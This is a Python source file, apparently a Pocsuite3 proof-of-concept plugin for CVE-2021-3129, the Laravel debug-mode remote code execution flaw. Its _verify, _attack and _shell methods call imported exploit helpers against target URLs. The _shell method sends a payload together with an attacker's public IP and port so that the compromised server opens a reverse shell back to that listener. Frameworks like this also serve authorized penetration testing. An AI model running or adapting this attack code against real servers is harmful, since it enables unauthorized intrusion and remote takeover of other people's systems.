"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
import json
from Framework.Valueconfig import FORMATTIME, ValueStatus
from collections import OrderedDict
import datetime
import random
import string
from urllib.parse import quote, urljoin, urlparse
from Framework.Library.Function.Function.PocSuite.Function import decode_data_input_poc
from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths,get_listener_ip, get_listener_port
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str


import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
from configvalue import *
from Framework.Library.Function.Function.PocSuite.init_pocs.cve_2021_3129. exploit_laravel import exploit_laravel, shell_laravel, verify_laravel
class DemoPOC(POCBase):
    vulID = 'CVE-2021-3129'  # ssvid
    version = '1.0'
    author = ['asdcxsd']
    vulDate = '13/01/2021'
    createDate = '2021/09/13'
    
    updateDate = '2021/09/13'
    references = ['https://www.ambionics.io/blog/laravel-debug-rce']
    name = 'Laravel <= v8.4.2 debug mode: Remote code execution '
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.SERVER,
                "pocType": "Language", 
                "language"  : [POC_SCAN.LANGUAGE.PHP]}
    appName = 'laravel-cve-2021-3129'
    appVersion = 'CVE-2021-3129'
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''Laravel <= v8.4.2 debug mode: Remote code execution '''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSS: 9.5 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C)'''
    url_result = {}
    def _verify(self, update=True):
        if update:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['RECON_WEBAPP']
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
        result = {}
        flag = "Version"
        self.result_url = []
        for url in self.url:
            try:
                if verify_laravel(url): self.result_url.append(url)
            except:
                pass
        if len(self.result_url ) > 0:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = self.result_url
        if update:
            return self.parse_output(result)
        else:
            return result

    def _attack(self):
        config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
        try:
            self.url = config_input['Input']['RECON_WEBAPP']
        except Exception as e:
            raise Exception("Error " +  self.appName +   " :" + str(e))
        try:
            self._verify(update=False)
            data_attack = []
            url_attack = []
            for url in self.result_url:
                try:
                    ans = exploit_laravel(url)
                    if ans != "":
                        data_attack.append(ans)
                        url_attack.append(url)

                except Exception as e:
                    print("Error cve-2021-3129: ", e)
            if len(data_attack) > 0:
                result = {}
                result['ShellInfo'] = {}
                result['ShellInfo']['data'] =  data_attack 
                result["ShellInfo"]['url'] = url_attack
                result['ShellInfo']['info'] = '''CVE-2021-3129 RCE''' 
                return self.parse_output(result)
        except Exception as e:
            print("Error CVE-2021-3129:", e)
        return self.parse_output(False)

    def _shell(self):
        result = {}
        result['ShellInfo'] = {
                'Status': 'Success'
            }
        try:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['EXPLOIT_POCS']
                lhost_running = config_input['Config']['Cf_PublicIP']
                lport_running = config_input['Config']['Cf_PublicPort']
                #lport_running = 4443
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
            #self._verify(update=False)
            payload = self.url[0]['result']['ShellInfo']['data'][0]
            self.url = self.url[0]['result']['ShellInfo']['url'][0]
            
            result['url'] = self.url
            result['payload'] = payload
            statuserr = shell_laravel(self.url, payload, lhost_running, lport_running )
            if (statuserr):
                result['ShellInfo']['Status'] = "Error"
            return self.parse_output(result)
        except  Exception as e:
            if type(e) == requests.exceptions.ReadTimeout:
                return self.parse_output(result)
            print("Error run shell", self.name, e)
            pass
        return self.parse_output(False)
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
